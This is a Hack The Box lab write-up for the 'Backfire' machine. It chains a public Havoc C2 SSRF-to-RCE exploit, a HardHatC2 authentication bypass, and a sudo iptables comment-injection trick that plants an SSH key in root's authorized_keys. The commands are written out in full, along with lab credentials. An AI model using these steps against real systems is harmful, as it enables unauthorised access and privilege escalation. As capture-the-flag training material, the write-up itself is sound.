<h1>BACKFIRE WRITE UP</h1>

<img width="698" height="382" alt="backfire" src="https://github.com/user-attachments/assets/f914e9c9-8d24-4201-8284-fa61a28f25dc" /><br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Medium<br>
<b>Operating System:</b> Linux<br>
<b>IP Address:</b> 10.10.11.49<br>
<b>Hostname:</b> backfire.htb<br>
<b>Open Ports:</b> 22/tcp, 443/tcp, 8000/tcp, 5000/tcp<br>
<b>Web Server:</b> nginx 1.22.1<br>
<b>Addition:</b> Havoc, HardHatC2<br>

<h2>SUMMARY</h2>

Backfire is a medium-difficulty box that starts with an exposed Havoc command and control server, where I exploit Server Side Request Forgery to ultimately establish a communication stream to Havoc's WebSocket API and inject malicious commands to get remote code execution in Havoc payload compile process. Once I gain the initial foothold, another C&C is running locally named Hardhat. The Hardhat C&C is open source, so I craft a JWT token with the default hardcoded JWT secret key. The user account can execute iptables & iptables-save for privilege escalation, allowing the attacker to achieve arbitrary file write.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan.

<code>nmap -sC -sV 10.10.11.49</code>

Result:

<img width="1034" height="574" alt="ss1" src="https://github.com/user-attachments/assets/26b86748-2888-495f-beef-3f6d3b47d7f3" /><br>

As I can see ports 22(SSH), 443(HTTPS), 8000(HTTP) and 5000(UPNP) are open.

<b>2-</b> Visit "http://10.10.11.49:8000"

<img width="1366" height="688" alt="ss2" src="https://github.com/user-attachments/assets/050a3955-052f-4b1b-946a-efa115b61e95" /><br>

On this page I find two files. I immidiately think these files are about some sort of configuration.

<b>3-</b> First read "disable_tls.patch" file. For that

<code>vim disable_tls.patch</code>

For an easy understanding i prefer vim here.

Result:

<img width="859" height="608" alt="ss3" src="https://github.com/user-attachments/assets/5bef1a75-4a61-4ba0-ae85-b4f0d066508a" /><br>

In my understanding this is a configration about disabling tls like it's mentioned also in the file name. It means port 443 won't show me any page or result.

<b>4-</b> Now I read "havoc.yaotl" file. For that

<code>vim havoc.yaotl</code>

Result:

<img width="568" height="607" alt="ss4" src="https://github.com/user-attachments/assets/6d080c08-01da-44a7-9dc0-fba3284b2306" /><br>

This file gives me lots of information. First I see that this is a configration file for <a href="https://github.com/HavocFramework/Havoc">Havoc</a> server, I also see the host name is "backfire.htb", teamserver host/port information and find some credentials about this Havoc server.

First username=ilya	password=CobaltStr1keSuckz!
Second username=sergej	password=1w4nt2sw1tch2h4rdh4tc2

<b>5-</b> I add "backfire.htb" host name to my "/etc/hosts" file.

<code>echo "10.10.11.49	backfire.htb" | sudo tee -a /etc/hosts</code>

<b>6-</b> I start searching about Havoc and Havoc related vulnerabilities. I find this <a href="https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE">github page</a>.

<code>git clone https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE</code>

<b>7-</b> In this github file, main exploitation script is run by python. So I start a virtual environment for this.

<code>python3 -m venv myenv && source myenv/bin/activate</code>

After that I install all requirements from "requirements.txt".

<code>pip install -r requirements.txt</code>

<b>8-</b> From now on I'm ready to go do some changes in "exploit.py" and "payload.sh". For that in "exploit.py"

<img width="369" height="64" alt="ss5" src="https://github.com/user-attachments/assets/530fd696-62bd-4edb-a4f9-1f2685613695" /><br>

and end of the code

<img width="672" height="21" alt="ss6" src="https://github.com/user-attachments/assets/9f4365a0-f8ba-4ae9-97eb-e9129b91e5e0" /><br>

In payload.sh

<img width="445" height="22" alt="ss7" src="https://github.com/user-attachments/assets/62afcc5a-0e20-4e53-a689-f84290ce2b39" /><br>

<b>9-</b> After all this changes I start to "exploit.py" according to github page instructions. For that I first start listening with netcat.

<code>nc -lvnp 9090</code>

After that start http server.

<code>python3 -m http.server 8000</code>

And lastly start "exploit.py" like this "exploit.py -t https://[TARGET MACHINE IP] -i [HAVOC.YOATL TEAMSERVER HOST] -p [HAVOC.YOATL TEAMSERVER PORT]".

<code>python3 exploit.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056</code>

Result:

<img width="1267" height="449" alt="ss8" src="https://github.com/user-attachments/assets/8e8646d6-9ebf-450f-93c8-b7880c4ac0bb" /><br>

This is how I get access to the shell!!

<b>11-</b> I need to go "/home/ilya" for "user.txt".

<code>cd /home/ilya && ls</code>

Result:

<img width="108" height="66" alt="ss9" src="https://github.com/user-attachments/assets/de594d1e-9261-41df-ad2b-dc76e76b3c63" /><br>

As you can see, this is how I get user flag!!

<b>12-</b> Now I got some problem about my shell connection. Connection automaticaly timeout aproxemitly 30-45 seconds later after connection starts.

<b>13-</b> For a stable connection first I check "~/.ssh" directory access. And I can access as "ilya" user. So from now on I can use a key for stable ssh connection.

First I create a key on my system:

<code>ssh-keygen -t rsa -C "fnwn@htb.ctf"</code>

Result:

<img width="1354" height="153" alt="ss10" src="https://github.com/user-attachments/assets/c9ee6d8f-fe4e-44e4-baa4-6616a94fe7c9" /><br>

<b>14-</b> Now I need to add this "id_rsa.pub" key value to target machine's "authorized_keys" file. For that I use netcat.

On my system:

<code>nc 10.10.11.49 9900 < ~/.ssh/id_rsa.pub</code>

10.10.11.49 is target machine IP address and port 9900 is my choice for this connection.

On target system:

<code>nc -lvnp 9900 >> ~/.ssh/authorized_keys</code>

Result:

<img width="1351" height="312" alt="ss11" src="https://github.com/user-attachments/assets/59089bc3-0d94-4e5d-8d6c-dcac91f542e3" /><br>

Now I got stable ssh connection as "ilya" user without password.

<b>15-</b> I look at files and find "hardhat.txt".

<code>ls</code>

Result:

<img width="297" height="56" alt="ss12" src="https://github.com/user-attachments/assets/a83039d0-7d2f-4b63-acc5-794c81083b7c" /><br>

<b>16-</b> When I read the file I get some information about HardHatC2 server usage.

<code>cat hardhat.txt</code>

Result:

<img width="719" height="66" alt="ss13" src="https://github.com/user-attachments/assets/46deb919-ae19-4597-8414-02d6138aea4d" /><br>

From this note I can understand there is <a href="https://github.com/DragoQCC/CrucibleC2">HardHatC2</a> server running with default settings.

<b>17-</b> After my research I find this write up about HardHatC2 vulnerability <a href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7">here</a>.

<b>18-</b> I check netstat results for port conditions.

<code>netstat -tuln</code>

Result:

<img width="610" height="210" alt="ss14" src="https://github.com/user-attachments/assets/733cb8dd-3523-4369-bb13-1efaed7ce313" /><br>

And as I see there is ports 5000 and 7096 are in a listening state.

<b>19-</b> For connection to HardHatC2 server via local environment

<code>ssh -L 7096:localhost:7096 -L 5000:localhost:5000 ilya@backfire.htb</code>

Result:

<img width="1366" height="689" alt="ss15" src="https://github.com/user-attachments/assets/9efd8898-8a0d-45b0-af51-c7099c32e682" /><br>

And I can review HardHatC2 web interface on my browser as "https://localhost:7096".

<b>20-</b> In the write up there is a python script. In this script made some changes about username and password. For that

<code>vim script.py</code>

Result:

<img width="193" height="80" alt="ss16" src="https://github.com/user-attachments/assets/1313adaa-1c8b-4502-b680-641ca1db3e27" /><br>

As you can see I change username and password value to my own.

<b>21-</b> After that, run the script.

<code>python3 script.py</code>

Result:

<img width="1355" height="202" alt="ss17" src="https://github.com/user-attachments/assets/c45097a3-1be2-4c39-938f-d99bdbde5b05" /><br>

And now I create my account with "fnwn" username and password. So from now on I can login HardHatC2 system.

<b>22-</b> Now I go to "/ImplantInteract" page and add terminal here. In terminal I can use os commands like a normal terminal.

<img width="1366" height="687" alt="ss18" src="https://github.com/user-attachments/assets/71efd7d6-b79b-4c4a-8304-80d1323730b5" /><br>

As you can see I am user as "sergej" in target system.

<b>23-</b> I need a stable connection like before. For that I use the same way as before

On my system:

<code>nc 10.10.11.49 9900 < ~/.ssh/id_rsa.pub</code>

On target system:

<code>nc -lvnp 9900 >> ~/.ssh/authorized_keys</code>

Result:

<img width="1366" height="690" alt="ss19" src="https://github.com/user-attachments/assets/fce3f8ca-15cb-4f5f-8e2e-cffa0b4c2593" /><br>

<b>24-</b> From now on I can establish ssh connection as user "sergej" without password.

<img width="729" height="255" alt="ss20" src="https://github.com/user-attachments/assets/2f049053-b37b-471d-8576-e1ad467720c9" /><br>

<b>25-</b> Start gathering information about sergej(Permissions etc.). For that

<code>id</code>

<code>sudo -l</code>

Result:

<img width="937" height="166" alt="ss21" src="https://github.com/user-attachments/assets/a2f750a3-284d-4159-8df6-d1853377a164" /><br>

<b>26-</b> I can see "sergej" got root permissions on "iptables" and "iptables-save" commands. So I start my research about these commands and find this write up <a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/">here</a>.

<b>27-</b> In this write up author creates a root user on the test system. I'm not gonna do that. My target is a community machine so I don't wanna break something and give other users a hard time. So for that instead of creating a new user, I create a ssh key and send this key root's authorized_keys file. For that

On my system:

<code>ssh-keygen -t ed25519 -C "fnwn@htb.ctf"</code>

I create a new key for this because "--comment" flag has a limit of 256 characters.

On target system:

<code>sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAaf27MOr6ydoHAvR8qgW8rwbuiZ4tVkxe7tAcF8ZJP fnwn@htb.ctf\n'</code>

With this command I add my id_ed25519.pub key value to input stream.

<code>sudo iptables -S</code>

I can see this is working.

<code>sudo iptables-save -f /root/.ssh/authorized_keys</code>

And finally I write my key value in to the root "authorized_keys" file.

Result:

<img width="1363" height="282" alt="ss22" src="https://github.com/user-attachments/assets/e937ffdb-b284-41b6-9bf3-185f7c46324f" /><br>

<b>28-</b> I start new ssh connection as "root" user without password.

<code>ssh root@backfire.htb</code>

Result:

<img width="735" height="282" alt="ss23" src="https://github.com/user-attachments/assets/cd2b37ab-29d7-47d6-bf7f-9c6cc03327e6" /><br>

And there it is how I get the root flag!!

<h2>RESOURCE</h2>
<ul>
<li><a href="https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE">CVE-2024-41570 HAVOC C2 RCE</a></li>
<li><a href="https://github.com/DragoQCC/CrucibleC2">HARDHATC2</a></li>
<li><a href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7">HARDHATC2 0-DAYS WRITE UP</a></li>
<li><a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/">SUDO IPTABLES PRIVESC</a></li>
</ul>
